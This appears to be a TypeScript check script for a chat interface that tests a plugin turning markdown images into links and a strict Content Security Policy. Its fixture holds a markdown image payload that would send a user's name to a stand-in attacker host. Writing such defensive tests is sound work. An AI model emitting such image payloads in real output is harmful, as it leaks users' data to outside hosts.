/**
 * Checks of interface safety and behaviour that need no browser (no test runner):
 *   node --experimental-strip-types --no-warnings --import ./scripts/register-ts.mjs scripts/check-ui.mts
 */
import assert from "node:assert/strict";
import type { Element, Root, RootContent } from "hast";
import remarkGfm from "remark-gfm";
import remarkParse from "remark-parse";
import remarkRehype from "remark-rehype";
import { unified } from "unified";
import { contentSecurityPolicy } from "@/lib/csp";
import { rehypeImagesAsLinks } from "@/lib/markdown";

let checks = 0;
function check(name: string, fn: () => void | Promise<void>) {
  return Promise.resolve(fn()).then(
    () => {
      checks++;
    },
    (error: unknown) => {
      console.error(`FAIL ${name}`);
      throw error;
    },
  );
}

function elements(node: Root | RootContent, out: Element[] = []): Element[] {
  if (node.type === "element") out.push(node);
  if ("children" in node) for (const child of node.children) elements(child, out);
  return out;
}

async function render(markdown: string, safe = true): Promise<Element[]> {
  const pipeline = unified().use(remarkParse).use(remarkGfm).use(remarkRehype);
  const tree = (await (safe ? pipeline.use(rehypeImagesAsLinks) : pipeline).run(pipeline.parse(markdown))) as Root;
  return elements(tree);
}

const LEAK = "![logo](https://attacker.example/p.png?d=Alex%20Morgan)\n\nText ![][ref]\n\n[ref]: https://attacker.example/r.png";

await check("markdown images would load without the plugin (the problem)", async () => {
  assert.equal((await render(LEAK, false)).filter((e) => e.tagName === "img").length, 2);
});

await check("markdown images become links, inline and by reference", async () => {
  const els = await render(LEAK);
  assert.equal(els.filter((e) => e.tagName === "img").length, 0);
  const links = els.filter((e) => e.tagName === "a" && e.properties.dataImage);
  assert.deepEqual(
    links.map((a) => a.properties.href),
    ["https://attacker.example/p.png?d=Alex%20Morgan", "https://attacker.example/r.png"],
  );
});

await check("images inside tables and lists become links too", async () => {
  const els = await render("| a |\n|---|\n| ![x](https://a.example/1.png) |\n\n- ![y](https://a.example/2.png)");
  assert.equal(els.filter((e) => e.tagName === "img").length, 0);
  assert.equal(els.filter((e) => e.tagName === "a").length, 2);
});

await check("CSP keeps the page to itself and the API", () => {
  const csp = Object.fromEntries(
    contentSecurityPolicy("http://localhost:8000/", false)
      .split("; ")
      .map((d) => [d.split(" ")[0], d.split(" ").slice(1)]),
  );
  assert.deepEqual(csp["default-src"], ["'self'"]);
  assert.deepEqual(csp["img-src"], ["'self'", "data:", "blob:"]);
  assert.deepEqual(csp["connect-src"], ["'self'", "http://localhost:8000"]);
  for (const [name, values] of Object.entries(csp)) {
    for (const v of values as string[]) assert.ok(!/^https?:$|^\*$|^https?:\/\/\*/.test(v), `${name} allows any host: ${v}`);
  }
  assert.ok(!csp["script-src"].includes("'unsafe-eval'"), "production allows eval");
  assert.ok(contentSecurityPolicy("http://localhost:8000", true).includes("'unsafe-eval'"), "dev needs eval for fast refresh");
});

console.log(`ok  ${checks} interface checks`);
